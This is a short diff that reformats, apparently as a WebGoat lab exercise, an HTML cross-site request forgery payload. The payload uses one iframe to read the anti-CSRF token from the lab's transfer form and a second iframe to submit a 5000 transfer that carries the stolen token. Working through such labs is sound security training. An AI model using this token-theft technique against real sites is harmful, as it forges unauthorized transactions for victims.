@@ -1,9 +1,1 @@
-<iframe id="iframe1" src='http://localhost:2210/WebGoat/attack?Screen=605842438&menu=900&transfer=main' onload="setIframe2Source()"></iframe>
-<iframe id="iframe2"></iframe>
-
-<script>
-    function setIframe2Source() {
-        document.getElementById('iframe2').src = 'http://localhost:2210/WebGoat/attack?Screen=605842438&menu=900&transfer=5000&token=' 
-        + document.getElementById("iframe1").contentWindow.document.form.token.value;
-    }
-</script>
+<iframe id="iframe1" src='http://localhost:2210/WebGoat/attack?Screen=605842438&menu=900&transfer=main' onload="setIframe2Source()"></iframe><iframe id="iframe2"></iframe><script>function setIframe2Source() {document.getElementById('iframe2').src = 'http://localhost:2210/WebGoat/attack?Screen=605842438&menu=900&transfer=5000&token=' + document.getElementById("iframe1").contentWindow.document.form.token.value;}</script>
